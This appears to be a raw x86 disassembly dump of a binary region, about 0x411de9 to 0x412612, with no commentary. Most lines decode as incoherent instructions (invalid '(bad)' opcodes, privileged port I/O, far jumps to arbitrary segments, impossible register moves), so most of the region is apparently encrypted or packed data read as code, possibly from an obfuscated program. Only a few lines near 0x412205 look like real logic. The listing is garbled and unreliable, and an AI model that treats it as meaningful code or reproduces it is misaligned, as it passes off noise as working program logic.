  411de9:	pop    ds
  411dea:	xor    bh,BYTE PTR [eax+0x1f2f14b4]
  411df0:	or     eax,0x69d751f6
  411df5:	lahf   
  411df6:	push   edi
  411df7:	out    0x72,eax
  411df9:	sub    BYTE PTR [ebx],cl
  411dfb:	leave  
  411dfc:	les    ebp,FWORD PTR [edi]
  411dfe:	int3   
  411dff:	lahf   
  411e00:	dec    edi
  411e01:	jns    0x411d8d
  411e03:	not    DWORD PTR [eax+ebp*2]
  411e06:	clc    
  411e07:	xor    DWORD PTR [eax+0x7],esi
  411e0a:	push   esi
  411e0b:	fmul   QWORD PTR [eax]
  411e0d:	xchg   esp,eax
  411e0e:	cmc    
  411e0f:	mov    edx,0x467fb4ed
  411e14:	repz dec ebx
  411e16:	shl    BYTE PTR [edx+0x38],cl
  411e19:	sbb    esp,DWORD PTR [edi+0x5d5f001c]
  411e1f:	and    DWORD PTR [ebx],esp
  411e21:	ja     0x411def
  411e23:	inc    esi
  411e24:	cmp    eax,0xe4ec4a23
  411e29:	lock sahf 
  411e2b:	dec    eax
  411e2c:	mov    ebx,0x844f9352
  411e31:	ins    DWORD PTR es:[edi],dx
  411e32:	push   ebx
  411e33:	jge    0x411e80
  411e35:	or     ecx,DWORD PTR [edx+0x38bf9fa8]
  411e3b:	push   ebx
  411e3c:	xor    BYTE PTR [ebx-0x61],bl
  411e3f:	pop    es
  411e40:	xor    BYTE PTR [ecx+0x22b8cf80],0x2c
  411e47:	mov    edi,edx
  411e49:	call   0x9c10:0x48c3d1a2
  411e50:	fwait
  411e51:	cld    
  411e52:	pusha  
  411e53:	aad    0xa0
  411e55:	neg    BYTE PTR ds:0xf470784a
  411e5b:	mov    cl,0xdf
  411e5d:	xchg   ebp,eax
  411e5e:	pusha  
  411e5f:	hlt    
  411e60:	push   esi
  411e61:	sbb    ah,dh
  411e63:	and    ecx,esi
  411e65:	imul   edi,DWORD PTR [eax],0xcd7af7b7
  411e6b:	iret   
  411e6c:	mov    ch,0x95
  411e6e:	pop    ebp
  411e6f:	cli    
  411e70:	enter  0xb01c,0x9b
  411e74:	sbb    eax,0xd6bc1b52
  411e79:	jmp    0x3667:0x5c21c66
  411e80:	mov    ecx,0x9fe23994
  411e85:	ds jge 0x411e97
  411e88:	call   0xd9ccfc32
  411e8d:	push   0x6030898c
  411e92:	call   0x30cb3594
  411e97:	adc    ah,dl
  411e99:	test   BYTE PTR [ecx],al
  411e9b:	push   0xffffffef
  411e9d:	(bad)  
  411e9e:	int    0xec
  411ea0:	mov    cl,0x73
  411ea2:	mov    bh,0xf9
  411ea4:	enter  0x5c3a,0xa6
  411ea8:	add    al,0x48
  411eaa:	push   esp
  411eab:	std    
  411eac:	push   ebp
  411ead:	test   al,0x7b
  411eaf:	imul   ecx,DWORD PTR [eax-0x1e],0x2f60a27
  411eb6:	in     eax,dx
  411eb7:	jae    0x411eee
  411eb9:	jne    0x411e5b
  411ebb:	xor    DWORD PTR [ebx],0x199934af
  411ec1:	cmc    
  411ec2:	inc    ebp
  411ec3:	inc    esi
  411ec4:	(bad)  ds:0x2997f5f
  411eca:	adc    DWORD PTR [esi],edx
  411ecc:	lahf   
  411ecd:	push   ds
  411ece:	ins    BYTE PTR es:[edi],dx
  411ecf:	dec    esp
  411ed0:	fist   WORD PTR [eax]
  411ed2:	ret    0x87e7
  411ed5:	test   al,0x43
  411ed7:	scas   eax,DWORD PTR es:[edi]
  411ed8:	retf   0xe151
  411edb:	cld    
  411edc:	fs mov dh,0x5f
  411edf:	pop    edx
  411ee0:	xor    BYTE PTR gs:[ebx-0x4],al
  411ee4:	shr    BYTE PTR [edx+0x53214332],1
  411eea:	cmc    
  411eeb:	icebp  
  411eec:	sub    esi,edi
  411eee:	sbb    DWORD PTR [ecx+0x3d2ee44f],ecx
  411ef4:	mov    al,ds:0xbefd42fb
  411ef9:	jecxz  0x411ed2
  411efb:	ins    DWORD PTR es:[edi],dx
  411efc:	or     ebp,DWORD PTR [ecx+0x13cde7a3]
  411f02:	push   esp
  411f03:	aas    
  411f04:	iret   
  411f05:	bound  edx,QWORD PTR [esi+0x6852f34d]
  411f0b:	pop    es
  411f0c:	jmp    DWORD PTR [ebp-0x72]
  411f0f:	jns    0x411f4d
  411f11:	and    eax,0xba38073a
  411f16:	pop    edi
  411f17:	push   0x57948ef7
  411f1c:	xor    esi,DWORD PTR [esi+0x1a]
  411f1f:	fs mov edi,0xd50189ef
  411f25:	jno    0x411f8a
  411f27:	(bad)  
  411f28:	les    ebp,FWORD PTR [esi+0x43]
  411f2b:	hlt    
  411f2c:	js     0x411f74
  411f2e:	sar    esp,1
  411f30:	sbb    al,0x2b
  411f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f33:	pop    ebx
  411f34:	mov    bh,0x16
  411f36:	ins    DWORD PTR es:[edi],dx
  411f37:	int    0x1
  411f39:	sub    eax,0xdaade13c
  411f3e:	stc    
  411f3f:	push   eax
  411f40:	mov    DWORD PTR [ebp+0x6d],edi
  411f43:	ins    BYTE PTR es:[edi],dx
  411f44:	dec    eax
  411f45:	cmp    al,0x75
  411f47:	cs cmp bl,bh
  411f4a:	in     eax,dx
  411f4b:	jne    0x411f0c
  411f4d:	jnp    0x411fa8
  411f4f:	icebp  
  411f50:	test   DWORD PTR [eax-0x461f406],edx
  411f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f57:	sti    
  411f58:	(bad)  
  411f59:	outs   dx,BYTE PTR ds:[esi]
  411f5a:	xchg   ebx,eax
  411f5b:	mov    BYTE PTR [edx-0x28],ah
  411f5e:	sub    DWORD PTR [edi+0x3],0x2b9757dc
  411f65:	adc    esp,0xa18feb01
  411f6b:	mov    edi,0x550ac2c6
  411f70:	add    BYTE PTR [edi-0x3baa74e2],bh
  411f76:	mov    edi,DWORD PTR [ebp-0x4]
  411f79:	xor    edi,eax
  411f7b:	xor    edx,eax
  411f7d:	jmp    0x412205
  411f82:	rol    dl,1
  411f84:	enter  0xdac3,0xd1
  411f88:	fcmovnu st,st(1)
  411f8a:	xchg   ebp,eax
  411f8b:	add    al,0x8c
  411f8d:	inc    edi
  411f8e:	and    DWORD PTR es:[ebp+0x786beb82],ecx
  411f95:	js     0x411f7c
  411f97:	jle    0x412011
  411f99:	js     0x411fad
  411f9b:	imul   edx,DWORD PTR [eax],0xff84e886
  411fa1:	(bad)  
  411fa2:	push   cs
  411fa3:	xchg   DWORD PTR [eax-0x4bdc15a],esi
  411fa9:	adc    eax,0xc157ab74
  411fae:	pop    eax
  411faf:	cld    
  411fb0:	or     ecx,esi
  411fb2:	adc    eax,0xc349ca51
  411fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fb8:	fcmovbe st,st(0)
  411fba:	aam    0x5c
  411fbc:	jb     0x411fff
  411fbe:	xchg   ebx,eax
  411fbf:	push   0xffffffbf
  411fc1:	cmp    eax,0xd2edaf87
  411fc6:	mov    edx,0xe6ffd83
  411fcb:	pop    ecx
  411fcc:	cmp    al,0x41
  411fce:	loop   0x411f89
  411fd0:	fdivr  DWORD PTR [edx+0x9]
  411fd3:	rcr    BYTE PTR [edi],1
  411fd5:	int3   
  411fd6:	mov    esi,0x8e17888d
  411fdc:	stc    
  411fdd:	in     al,dx
  411fde:	imul   edi,DWORD PTR [esi-0x4e325ae3],0x391910e8
  411fe8:	pop    ecx
  411fe9:	enter  0xf1ce,0xd2
  411fed:	pop    ecx
  411fee:	xchg   esi,eax
  411fef:	shl    DWORD PTR [ecx+0x11c48ec2],cl
  411ff5:	call   0x8aca:0x10927227
  411ffc:	dec    esi
  411ffd:	jo     0x411fb4
  411fff:	out    dx,eax
  412000:	es push 0xffffffd0
  412003:	cld    
  412004:	or     ebp,DWORD PTR [esi-0x21]
  412007:	pop    es
  412008:	and    bh,BYTE PTR [esi]
  41200a:	xor    DWORD PTR [esi-0x76],ebx
  41200d:	push   cs
  41200e:	sbb    al,0xf9
  412010:	ss mov al,bh
  412013:	int3   
  412014:	inc    ecx
  412015:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412017:	aam    0xf6
  412019:	call   0xf3ae906f
  41201e:	inc    esp
  41201f:	mov    ds:0xe30179c9,al
  412024:	or     DWORD PTR [edx-0x48],esp
  412027:	adc    al,0xf7
  412029:	jle    0x411fc8
  41202b:	fwait
  41202c:	lea    edx,[edi+0x7a]
  41202f:	or     DWORD PTR [eax],eax
  412031:	test   DWORD PTR [edx],eax
  412033:	out    dx,al
  412034:	mov    ds:0x96f1ae63,eax
  412039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41203a:	push   ds
  41203b:	cmp    eax,0xc5992463
  412040:	mov    ?,WORD PTR [edi+0x3fcb6fe8]
  412046:	pop    eax
  412047:	or     al,0x6
  412049:	rcl    BYTE PTR [edx+0x13],cl
  41204c:	pushf  
  41204d:	popf   
  41204e:	mov    ebx,0xcd60e370
  412053:	fcom   DWORD PTR [eax+0xec0f32e]
  412059:	loop   0x412027
  41205b:	lea    ebp,[ebp-0x30171b5f]
  412061:	test   eax,0xa0b36d3e
  412066:	cmp    DWORD PTR [edi-0x12],0x2c
  41206a:	sbb    edi,esp
  41206c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41206d:	aam    0x8
  41206f:	cmp    eax,DWORD PTR [edx+eax*8-0x7dc2407f]
  412076:	sbb    ch,bh
  412078:	and    eax,0xba23c464
  41207d:	mov    DWORD PTR [edi],0x9cd3e975
  412083:	pop    esi
  412084:	rcl    ebp,0xcc
  412087:	dec    esi
  412088:	mov    ds:0x546729ff,al
  41208d:	iret   
  41208e:	add    DWORD PTR [eax],eax
  412090:	and    al,0x9f
  412092:	fimul  WORD PTR [edx]
  412094:	push   0x89b84b75
  412099:	fsub   QWORD PTR [edi]
  41209b:	mov    dl,0x8d
  41209d:	dec    ebx
  41209e:	bound  eax,QWORD PTR [edx+0x3d7dc204]
  4120a4:	daa    
  4120a5:	cld    
  4120a6:	push   ecx
  4120a7:	mov    al,0xa5
  4120a9:	mov    WORD PTR [ecx],ss
  4120ab:	lods   al,BYTE PTR ds:[esi]
  4120ac:	in     eax,dx
  4120ad:	(bad)  
  4120ae:	mov    ds:0xf5696f2f,al
  4120b3:	cvttps2pi mm7,xmm3
  4120b6:	(bad)  [eax+0x4f9b4c89]
  4120bc:	loope  0x412116
  4120be:	inc    edx
  4120bf:	iret   
  4120c0:	lds    esp,FWORD PTR [edi+0x6d7bec9f]
  4120c6:	dec    edi
  4120c7:	cmp    al,0x92
  4120c9:	lods   eax,DWORD PTR ds:[esi]
  4120ca:	adc    edi,DWORD PTR ds:0xd46c1320
  4120d0:	daa    
  4120d1:	mov    ds:0x22f60160,eax
  4120d6:	lds    ecx,FWORD PTR [edi+esi*4+0x7f40ad1d]
  4120dd:	or     al,0x58
  4120df:	rcr    DWORD PTR [edi+0x9],cl
  4120e2:	test   DWORD PTR [ebp+edx*1+0x6b],ebx
  4120e6:	mov    esi,0xc45e9c8f
  4120eb:	clc    
  4120ec:	les    di,DWORD PTR [edx]
  4120ef:	outs   dx,BYTE PTR ds:[esi]
  4120f0:	pop    ebx
  4120f1:	mov    esp,0x44ee096a
  4120f6:	imul   ebp,eax,0xc0e6e109
  4120fc:	push   edx
  4120fd:	sbb    eax,0x2f0c99b
  412102:	pop    ss
  412103:	xchg   edx,eax
  412104:	cmc    
  412105:	in     al,dx
  412106:	popa   
  412107:	cwde   
  412108:	add    dl,0x4
  41210b:	mov    al,0xa8
  41210d:	mov    ebp,0x9a806249
  412112:	mov    db0,eax
  412115:	inc    esi
  412116:	(bad)  
  412117:	xchg   esp,eax
  412118:	rcr    BYTE PTR [ecx+edx*4+0x1f81c31a],1
  41211f:	pop    eax
  412120:	and    al,0x22
  412122:	neg    bh
  412124:	jmp    0x41219e
  412126:	aam    0x7
  412128:	add    al,0xb1
  41212a:	adc    BYTE PTR [esi+0xa],dh
  41212d:	shr    WORD PTR [ebx],cl
  412130:	or     al,0x71
  412132:	mov    ?,eax
  412134:	add    BYTE PTR [ebp-0xa13cb44],dh
  41213a:	aas    
  41213b:	mov    edi,0x6008b138
  412140:	iret   
  412141:	in     al,dx
  412142:	loopne 0x4121a9
  412144:	sbb    al,BYTE PTR ds:0x1439d7da
  41214a:	dec    esp
  41214b:	outs   dx,BYTE PTR ds:[esi]
  41214c:	add    eax,0xc64514cd
  412151:	sub    bh,cl
  412153:	jmp    0x4120d7
  412155:	cmp    edx,esp
  412157:	add    eax,0x9534eebb
  41215c:	hlt    
  41215d:	push   ebx
  41215e:	xor    eax,0x46cbb31e
  412163:	xchg   ebx,eax
  412164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412165:	pop    esp
  412166:	arpl   di,cx
  412168:	sbb    DWORD PTR [edi],esi
  41216a:	jae    0x41210d
  41216c:	push   esi
  41216d:	dec    edx
  41216e:	xor    ah,0xb8
  412171:	in     al,dx
  412172:	adc    eax,0xa0b2b80e
  412177:	les    esi,FWORD PTR [edi-0x1c52ebe3]
  41217d:	dec    ebp
  41217e:	dec    edi
  41217f:	mov    edx,0x60fb4cb3
  412184:	stos   DWORD PTR es:[edi],eax
  412185:	mov    esp,DWORD PTR [ebx+ecx*8-0x2]
  412189:	outs   dx,DWORD PTR ds:[esi]
  41218a:	pop    esi
  41218b:	leave  
  41218c:	cdq    
  41218d:	mov    ecx,0xdfee973d
  412192:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412194:	push   es
  412195:	(bad)  
  412196:	into   
  412197:	dec    ebx
  412198:	in     eax,dx
  412199:	mov    edi,0x9cd0284d
  41219e:	xor    BYTE PTR [ebx],cl
  4121a0:	sbb    ah,cl
  4121a2:	push   cs
  4121a3:	mov    esp,0xbe089109
  4121a8:	mov    edi,0x9effb1a1
  4121ad:	jge    0x412148
  4121af:	add    al,0x6f
  4121b1:	pop    esp
  4121b2:	or     DWORD PTR [esi+0x7aa438f7],esi
  4121b8:	(bad)  
  4121b9:	dec    ebx
  4121ba:	out    dx,eax
  4121bb:	mov    DWORD PTR [esi],ecx
  4121bd:	mov    ecx,0x70a6215
  4121c2:	mov    ebp,ebp
  4121c4:	mov    ds:0x5b4b225,al
  4121c9:	push   ecx
  4121ca:	pop    edx
  4121cb:	sbb    al,0xd7
  4121cd:	mov    edx,0xd9a72d8f
  4121d2:	cmp    DWORD PTR [eax],esp
  4121d4:	jne    0x4121bb
  4121d6:	leave  
  4121d7:	xor    DWORD PTR [esi],0xfffffff7
  4121da:	lea    ecx,[ecx]
  4121dc:	shl    al,1
  4121de:	in     eax,dx
  4121df:	fwait
  4121e0:	neg    DWORD PTR [ecx+eiz*4]
  4121e3:	out    dx,al
  4121e4:	sbb    BYTE PTR [edx-0x33b32933],ch
  4121ea:	shl    BYTE PTR [edi-0x6d],cl
  4121ed:	inc    edx
  4121ee:	and    al,0x12
  4121f0:	std    
  4121f1:	add    dl,BYTE PTR [eax]
  4121f3:	mov    esi,0x16dc5bb
  4121f8:	stos   BYTE PTR es:[edi],al
  4121f9:	vaddsubps ymm0,ymm4,ymm0
  4121fd:	mov    bh,0xcd
  4121ff:	(bad)  
  412200:	and    esi,DWORD PTR [ecx]
  412202:	pop    ebp
  412203:	mov    dl,0x84
  412205:	add    edi,ecx
  412207:	add    edx,ecx
  412209:	imul   edx,edi
  41220c:	mov    DWORD PTR [ebp+0xc],edx
  41220f:	mov    edx,DWORD PTR [ebp+0xc]
  412212:	mov    DWORD PTR [ebp-0x24],edx
  412215:	mov    edx,DWORD PTR [ebp-0x8]
  412218:	add    edx,DWORD PTR [ebp-0x40]
  41221b:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  412222:	jmp    0x4124aa
  412227:	(bad)
  41222b:	(bad)  
  41222c:	fcmovnu st,st(1)
  41222e:	shr    esp,1
  412230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412231:	xchg   edx,eax
  412232:	(bad)  
  412233:	dec    edi
  412234:	xor    edx,DWORD PTR [edx]
  412236:	and    al,0x50
  412238:	imul   edi,DWORD PTR [eax+0x78],0x78787ee5
  41223f:	sbb    DWORD PTR es:[edx+0x73],edi
  412243:	or     BYTE PTR [esp+edi*1+0x16],al
  412247:	inc    edx
  412248:	dec    eax
  412249:	xor    DWORD PTR [ebx],ecx
  41224b:	jae    0x4121d8
  41224d:	sub    eax,0xd44bed8c
  412252:	inc    ebx
  412253:	mov    cl,0x3a
  412255:	ins    BYTE PTR es:[edi],dx
  412256:	imul   eax,DWORD PTR [edi+0x608d7185],0x8ceb9971
  412260:	or     ch,al
  412262:	pop    ebx
  412263:	imul   edx,DWORD PTR [ebp+0x61],0xfffffff4
  412267:	cmp    eax,0x7ab76ded
  41226c:	xchg   esi,eax
  41226d:	inc    ecx
  41226e:	stos   BYTE PTR es:[edi],al
  41226f:	pop    ds
  412270:	ret    
  412271:	jae    0x41221e
  412273:	adc    BYTE PTR [ecx+0x20],dh
  412276:	mov    esp,0xf2b0a79b
  41227b:	aam    0xda
  41227d:	ds cwde 
  41227f:	mov    ch,BYTE PTR [edi+0x5b0713e0]
  412285:	or     dl,0x60
  412288:	mov    bh,0x45
  41228a:	in     al,0xf5
  41228c:	aas    
  41228d:	jmp    0xbda0:0xcbb1b4c2
  412294:	dec    eax
  412295:	xor    BYTE PTR [edi-0x55],dl
  412298:	push   0xd4a24cac
  41229d:	(bad)  
  41229e:	or     eax,0xa13b8175
  4122a3:	dec    esp
  4122a4:	mov    al,ds:0x54067fa
  4122a9:	bound  ebp,QWORD PTR ds:0x1e5df99
  4122af:	jbe    0x412244
  4122b1:	stc    
  4122b2:	mov    WORD PTR [edx],ss
  4122b4:	cli    
  4122b5:	jbe    0x4122df
  4122b7:	push   cs
  4122b8:	fisub  DWORD PTR [esi+0x7452b255]
  4122be:	mov    edx,0x4e0d805f
  4122c3:	xchg   ebp,eax
  4122c4:	repnz loopne 0x412291
  4122c7:	jle    0x412253
  4122c9:	xchg   ebp,eax
  4122ca:	cs xchg sp,ax
  4122cd:	and    dh,BYTE PTR [esi]
  4122cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122d0:	cmp    al,0x65
  4122d2:	mov    ds:0x811b2104,al
  4122d7:	or     ebp,DWORD PTR [edi]
  4122d9:	xchg   al,cl
  4122db:	mov    eax,ds:0xb9f804a9
  4122e0:	xchg   edi,eax
  4122e1:	retf   
  4122e2:	imul   eax,DWORD PTR [esi-0x6e544142],0x6f04a66f
  4122ec:	idiv   DWORD PTR ds:0xe2c48392
  4122f2:	dec    esi
  4122f3:	pop    ecx
  4122f4:	mov    cl,0x42
  4122f6:	mov    cs,ebp
  4122f8:	xchg   edx,eax
  4122f9:	push   eax
  4122fa:	cld    
  4122fb:	mov    esi,0xfa63074e
  412300:	aaa    
  412301:	pusha  
  412302:	inc    edi
  412303:	and    al,0xfb
  412305:	and    al,0x81
  412307:	into   
  412308:	inc    ebx
  412309:	mov    ds:0xc3739b80,al
  41230e:	mov    BYTE PTR [esp+eiz*2-0x385cf3ec],al
  412315:	lea    esi,[edx+eax*8]
  412318:	cdq    
  412319:	or     DWORD PTR [esi+0x2e5175c],edi
  41231f:	call   0x47e8:0x6cc801df
  412326:	rcr    DWORD PTR [esi],cl
  412328:	pop    ss
  412329:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41232a:	stos   BYTE PTR es:[edi],al
  41232b:	loope  0x412329
  41232d:	push   edx
  41232e:	lods   al,BYTE PTR ds:[esi]
  41232f:	jmp    0x2cc64c5
  412334:	push   esp
  412335:	adc    esp,DWORD PTR [eax+0xb]
  412338:	xor    eax,0x57e23e57
  41233d:	pop    eax
  41233e:	loope  0x41233c
  412340:	ds pop ecx
  412342:	loope  0x412373
  412344:	adc    edi,DWORD PTR [esp+eax*1]
  412347:	add    BYTE PTR [ecx],0x16
  41234a:	fistp  QWORD PTR [eax]
  41234c:	ss daa 
  41234e:	not    BYTE PTR [edx+0x5d]
  412351:	push   esi
  412352:	xor    dh,BYTE PTR ds:0x524095a0
  412358:	lods   eax,DWORD PTR ds:[esi]
  412359:	cld    
  41235a:	popa   
  41235b:	push   es
  41235c:	aaa    
  41235d:	or     dl,cl
  41235f:	jno    0x4122e4
  412361:	enter  0xe1fa,0xbe
  412365:	outs   dx,BYTE PTR ds:[esi]
  412366:	and    eax,0x33d81d76
  41236b:	fs popa 
  41236d:	pop    esi
  41236e:	fidivr DWORD PTR [edx+0x22]
  412371:	hlt    
  412372:	aaa    
  412373:	mov    edx,0x13238e65
  412378:	cmp    al,0xeb
  41237a:	sar    BYTE PTR [eax+0x12],1
  41237d:	mov    esi,0x9d630aa8
  412382:	std    
  412383:	fsub   QWORD PTR [esi+edx*1+0x7c50e226]
  41238a:	std    
  41238b:	fst    QWORD PTR [ecx-0x1b55925f]
  412391:	inc    esp
  412392:	xchg   esp,eax
  412393:	int    0x25
  412395:	test   DWORD PTR [edx],ebx
  412397:	(bad)  
  412398:	adc    eax,0x9ec0c900
  41239d:	(bad)  
  41239e:	jmp    0x4123d1
  4123a0:	xlat   BYTE PTR ds:[ebx]
  4123a1:	jns    0x4123c3
  4123a3:	xchg   ecx,eax
  4123a4:	push   esp
  4123a5:	and    dh,BYTE PTR [edx]
  4123a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123a8:	push   edi
  4123a9:	sbb    al,0xc3
  4123ab:	lds    esp,FWORD PTR [eax+0x5a]
  4123ae:	xlat   BYTE PTR ds:[ebx]
  4123af:	paddd  mm1,QWORD PTR [ebx+edi*4-0x15]
  4123b4:	sub    BYTE PTR [eax-0x58],cl
  4123b7:	dec    edx
  4123b8:	push   eax
  4123b9:	sbb    eax,0x7109a5c
  4123be:	dec    edi
  4123bf:	test   BYTE PTR [eax-0x71],dh
  4123c2:	push   ds
  4123c3:	fisub  WORD PTR [edi+0x354a236a]
  4123c9:	dec    edx
  4123ca:	(bad)  
  4123cb:	adc    eax,DWORD PTR [eax+0x42]
  4123ce:	pop    ss
  4123cf:	cmp    DWORD PTR [eax],ecx
  4123d1:	call   0x1315:0x9773155c
  4123d8:	or     al,BYTE PTR [eax+0x487dbcf8]
  4123de:	mov    eax,0x7dd3ef9c
  4123e3:	sub    ah,BYTE PTR [ebx+eax*2+0x60f3815d]
  4123ea:	dec    ecx
  4123eb:	dec    ecx
  4123ec:	sahf   
  4123ed:	arpl   WORD PTR [ecx+0x3274ab4e],si
  4123f3:	js     0x412452
  4123f5:	shl    BYTE PTR [esi+0x77],0xfc
  4123f9:	cmp    DWORD PTR [edx-0x5e028852],esi
  4123ff:	(bad)  
  412400:	imul   edi,DWORD PTR [eax+eiz*1+0x10],0x11248ca
  412408:	mov    ebx,DWORD PTR [edi-0x45]
  41240b:	pop    ebx
  41240c:	loop   0x412428
  41240e:	loope  0x4123a0
  412410:	adc    dh,BYTE PTR [edi+0x78]
  412413:	scas   al,BYTE PTR es:[edi]
  412414:	lock mov ebp,0x71079dd4
  41241a:	mov    dh,0x93
  41241c:	jne    0x41241b
  41241e:	ror    BYTE PTR [esi+ebx*8],1
  412421:	add    al,0xd2
  412423:	pop    ebp
  412424:	push   ebp
  412425:	fs sub bh,bl
  412428:	test   bl,0x5b
  41242b:	out    dx,al
  41242c:	gs int 0xe4
  41242f:	sub    ebx,edx
  412431:	jmp    0xe12217eb
  412436:	pop    ebp
  412437:	xchg   ecx,eax
  412438:	inc    esi
  412439:	inc    ebx
  41243a:	clc    
  41243b:	loopne 0x412434
  41243d:	fs adc BYTE PTR ds:[eax],0xaa
  412442:	sbb    eax,0x32611016
  412447:	push   0xffffffc9
  412449:	mov    ecx,0x76bb8f0
  41244e:	aas    
  41244f:	or     BYTE PTR [ecx],dl
  412451:	xor    BYTE PTR [ebp-0x4ab68c9],0xaf
  412458:	nop
  412459:	jne    0x41247d
  41245b:	or     BYTE PTR [eax+0x5b],dl
  41245e:	adc    edx,DWORD PTR [edi-0x20951ee]
  412464:	out    dx,eax
  412465:	mov    eax,ds:0xbe991d60
  41246a:	sub    eax,0x2cf12725
  41246f:	push   ebp
  412470:	sub    edx,DWORD PTR [ebp+0xe5ffe5]
  412476:	add    DWORD PTR [ebx-0x1d],ecx
  412479:	retf   0xd800
  41247c:	jmp    0x4cdf:0x6582571e
  412483:	ss scas eax,DWORD PTR es:[edi]
  412485:	stos   BYTE PTR es:[edi],al
  412486:	fld    QWORD PTR [edi]
  412488:	std    
  412489:	out    0x23,eax
  41248b:	mov    ds:0xc8bbaacc,al
  412490:	test   eax,0x48ef1458
  412495:	or     eax,0x72f72b08
  41249a:	(bad)  
  41249b:	fsubr  QWORD PTR [eax+ebx*8]
  41249e:	or     eax,0xc30c9629
  4124a3:	stos   BYTE PTR es:[edi],al
  4124a4:	mov    cl,0x9d
  4124a6:	and    eax,0x894869ae
  4124ab:	push   ebp
  4124ac:	in     al,0xe9
  4124ae:	add    DWORD PTR [edx],0x0
  4124b1:	add    bh,cl
  4124b3:	ret    
  4124b4:	rol    esi,0xd1
  4124b7:	(bad)  
  4124b8:	fcmovnu st,st(1)
  4124ba:	mov    ebx,0xc31ebe60
  4124bf:	into   
  4124c0:	or     bl,bl
  4124c2:	cmp    eax,0xe578786e
  4124c7:	jle    0x412541
  4124c9:	js     0x412470
  4124cb:	mov    ds:0xf571b95e,eax
  4124d0:	push   esi
  4124d1:	out    dx,eax
  4124d2:	ds push eax
  4124d4:	addr16 data16 js 0x4124fe
  4124d8:	seta   BYTE PTR [ecx+0x1b]
  4124dc:	repnz mov ebp,0x1fa673d8
  4124e2:	and    BYTE PTR [ecx-0x2d813b1],0x82
  4124e9:	xchg   esi,eax
  4124ea:	call   0xce1ba639
  4124ef:	push   ds
  4124f0:	call   esi
  4124f2:	das    
  4124f3:	and    BYTE PTR [eax+0x4a],dh
  4124f6:	in     al,dx
  4124f7:	je     0x41253a
  4124f9:	rol    BYTE PTR [edi-0x4e28cb39],cl
  4124ff:	es out 0x22,eax
  412502:	idiv   DWORD PTR [ebp+0x4c]
  412505:	retf   
  412506:	fidivr DWORD PTR [edi]
  412508:	xor    al,0x6b
  41250a:	inc    esi
  41250b:	push   edi
  41250c:	cmp    cl,BYTE PTR [esi+0x34]
  41250f:	jge    0x4124d7
  412511:	(bad)  
  412512:	xor    al,0x1b
  412514:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412515:	imul   edx,ebx,0x1f4cd673
  41251b:	jl     0x41258a
  41251d:	xor    eax,0xffd5655f
  412522:	jmp    0x30ae8a75
  412527:	adc    eax,DWORD PTR ds:[esi]
  41252a:	xchg   esi,eax
  41252b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41252c:	icebp  
  41252d:	sub    ah,bh
  41252f:	push   0x254e177f
  412534:	jns    0x4124c5
  412536:	sub    eax,0xd75074bd
  41253b:	(bad)  
  41253c:	ficom  WORD PTR [edi+edi*2+0x21]
  412540:	jle    0x4125a0
  412542:	test   al,0x2f
  412544:	xchg   esi,eax
  412545:	pop    eax
  412546:	fiadd  WORD PTR [ebx+0x670ffb8]
  41254c:	clc    
  41254d:	cmp    cl,BYTE PTR [edi-0x63]
  412550:	clc    
  412551:	xchg   edx,eax
  412552:	or     bl,bh
  412554:	test   eax,0xbba014b0
  412559:	push   eax
  41255a:	cmc    
  41255b:	sub    al,dl
  41255d:	xchg   edi,eax
  41255e:	imul   edi,DWORD PTR [ebx+esi*8+0x221a79a9],0xe4ff2e3f
  412569:	mov    ds:0x2435510f,eax
  41256e:	xchg   edi,eax
  41256f:	jo     0x412547
  412571:	jg     0x4125de
  412573:	jb     0x412526
  412575:	or     BYTE PTR [ecx-0x53],bh
  412578:	rol    BYTE PTR [ebp+ebx*2+0x5c10c34a],cl
  41257f:	cmp    al,0x55
  412581:	mov    ds:0x70f8d0a4,eax
  412586:	mov    cl,0x9f
  412588:	inc    esi
  412589:	or     BYTE PTR [edx],al
  41258b:	adc    ebp,edx
  41258d:	push   esi
  41258e:	xchg   BYTE PTR [eax-0x4041e25a],ch
  412594:	imul   ecx,DWORD PTR [esi+ecx*4],0xfffffff6
  412598:	push   edx
  412599:	inc    edi
  41259a:	push   edx
  41259b:	fnstenv [edx+eax*2+0x3b15d058]
  4125a2:	ins    DWORD PTR es:[edi],dx
  4125a3:	adc    eax,0x2735f0fa
  4125a8:	punpcklwd mm5,mm7
  4125ab:	fidiv  DWORD PTR [esi+0x1f2a40bd]
  4125b1:	loope  0x41262e
  4125b3:	loope  0x412617
  4125b5:	(bad)  
  4125b6:	pop    ds
  4125b7:	jg     0x412598
  4125b9:	test   eax,0x95a31e1b
  4125be:	dec    edx
  4125bf:	xor    BYTE PTR [ebp+0x55d313b0],dl
  4125c5:	fwait
  4125c6:	mov    edi,0x65926362
  4125cb:	lds    edx,FWORD PTR [esi+0x3]
  4125ce:	(bad)
  4125d1:	or     bl,BYTE PTR [edx]
  4125d3:	nop
  4125d4:	fidiv  WORD PTR [eax-0x18bf4bf9]
  4125da:	or     eax,0xe0c7a57c
  4125df:	fild   QWORD PTR [ebp-0x58b4c4b0]
  4125e5:	adc    bl,dl
  4125e7:	push   ebp
  4125e8:	mov    bh,0xb6
  4125ea:	jmp    0x1a82:0xa74d26e7
  4125f1:	pop    ss
  4125f2:	sub    ecx,edx
  4125f4:	aam    0xab
  4125f6:	fmul   QWORD PTR [ecx-0x2ef00c51]
  4125fc:	fldenv [edx+0x2f]
  4125ff:	int    0x24
  412601:	lea    ebp,[ecx]
  412603:	inc    eax
  412604:	in     eax,dx
  412605:	into   
  412606:	cmp    DWORD PTR [esp+ecx*4-0xdb4d194],esi
  41260d:	fucomip st,st(2)
  41260f:	retf   0xbab5
  412612:	dec    ecx
